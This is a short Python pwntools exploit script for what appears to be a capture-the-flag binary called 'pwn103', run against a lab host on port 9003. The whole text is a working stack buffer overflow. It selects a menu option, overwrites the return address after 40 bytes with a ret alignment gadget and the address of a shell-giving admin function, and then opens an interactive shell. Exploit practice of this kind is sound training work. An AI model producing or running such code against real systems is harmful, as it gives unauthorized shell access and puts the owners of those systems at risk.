from pwn import *

# 1. Setup binary and target environment
exe = './pwn103-1644300337872.pwn103'
elf = context.binary = ELF(exe, checksec=False)

# 2. Connection details for remote exploitation
host = '10.65.178.52' 
port = 9003

# 3. Choose execution mode (Local vs Remote)
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe)

# 4. Construct the Payload
# We need to reach the General's command prompt first
p.sendlineafter(b":", b"3")

# Offset to reach the Return Address (RIP) is 40
offset = 40
ret_gadget = p64(0x401016) # Stack alignment gadget (ret)
admin_func = p64(0x401554) # Address of the admin/shell function

payload = b"A" * offset
payload += ret_gadget      # Necessary for stack alignment on Ubuntu
payload += admin_func

# 5. Send the attack
p.sendline(payload)

# 6. Final step: Get interactive shell access
p.interactive()